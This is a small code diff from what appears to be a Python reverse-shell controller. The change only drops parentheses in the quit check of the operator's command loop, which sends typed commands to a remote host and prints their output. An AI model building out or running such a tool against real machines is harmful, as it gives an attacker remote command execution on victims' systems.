@@ -56,7 +56,7 @@ def shell():
 		# Send/Receive commands
 		command = input("reverse-shell@%s:%d:~# " % (ip[0], ip[1]))
 		reliable_send(command)
-		if(command == "q" or command == "exit"):
+		if command == "q" or command == "exit":
 			break
 		else:
 			result = reliable_recv()
